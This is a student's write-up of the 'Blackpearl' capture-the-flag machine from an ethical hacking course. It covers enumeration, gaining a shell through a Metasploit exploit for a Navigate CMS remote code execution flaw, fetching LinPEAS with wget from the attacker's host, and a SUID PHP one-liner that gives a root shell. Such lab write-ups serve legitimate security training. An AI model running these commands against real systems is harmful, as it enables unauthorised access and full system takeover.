# 5th Capstone Machine
This is my write-up for the fifth machine in the capstone section of the Practical Ethical Hacking course.

## Machine Information
- **Name**: Blackpearl
- **Difficulty**: Easy
- **OS**: Debian
  
## Tools Used
- nmap: For port scanning and service enumeration.
- ffuf: To fuzz for directories and subdomains.
- DNSRecon: Perform a PTR Record lookup.
- LinPEAS: Privilege escalation path enumeration.

## Objectives
- Enumerate the system and identify services.
- Discover vulnerabilities within the system.
- Exploit the vulnerabilities to gain initial access.
- Escalate privileges to root.
  
## Enumeration
1. Nmap scan:
  
  - The first step was to enumerate open ports and services using nmap:
  
    `nmap -A -v -p- 10.0.2.154`

    ![image](https://github.com/user-attachments/assets/e6d222a0-b2ae-4a85-a59f-0214576f0396)

  
2. Port 80 HTTP Enumeration:

- Accessing the web server at `http://10.0.2.154` displayed an Nginx install page.

- Fuzzing for directories did not result in futher findngs.
  
3. DNS Enumeration:

- Used dnsrecon to scan for dns records.

  `dnsrecon -r 127.0.0.0/24 -n 10.0.2.154 -d domain`

  ![image](https://github.com/user-attachments/assets/6d400e76-4f4d-4a8b-a710-49a5bf0464cf)

- Added the record to /etc/hosts.

- Navigating to `http://blackpearl.tcm` showed a PHP info page.

- Ran ffuf for directory fuzzing:

  `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ`

- Found the directory /navigate which showed a login page for Navigate CMS.
     
## Initial Access
- Researched for Navigate CMS vulnerabilities and found an unauthenticated RCE vulnerability that has a metasploit module.
  
- Using the metasploit module, set the rhost at blackpearl.tcm.

  ![image](https://github.com/user-attachments/assets/ed040ca4-c399-4b5a-b0a1-cf8578c652b1)

- Ran the exploit and a meterpreter session opened.

- Entered shell to drop into a shell and ran whoami to see that the shell is running as www-data.

- Since the machine has python, used it to spawn a tty.

  `python -c 'import pty; pty.spawn("/bin/bash")'`

## Priviledge Escalation
- Transfered LinPEAS to the target machine.

  `python3 -m http.server 80`

  `wget http://10.0.2.15/linpeas.sh linpeas.sh`

  `chmod +x linpeas.sh`

- LinPEAS found that the SUID bit is set on a PHP binary.

- GTFOBins gives the command to escalte privileges.

  `/usr/bin/php7.3 -r "pcntl_exec('/bin/bash', ['-p']);"`

- This spawned a shell running as root.

  ![image](https://github.com/user-attachments/assets/e1f12cf8-c377-4ef3-b8ba-73a7f9286003)

## Lessons Learned
This machine provided practical experience in DNS enumeration, specifically understanding pointer records, server blocks, and configuring local DNS resolution with the /etc/hosts file. I also practiced privilege escalation techniques by identifying and exploiting SUID bits on binaries using LinPEAS and GTFOBins.

![image](https://github.com/user-attachments/assets/512bb12d-8dc9-4d8e-9970-7882dfb71ad5)
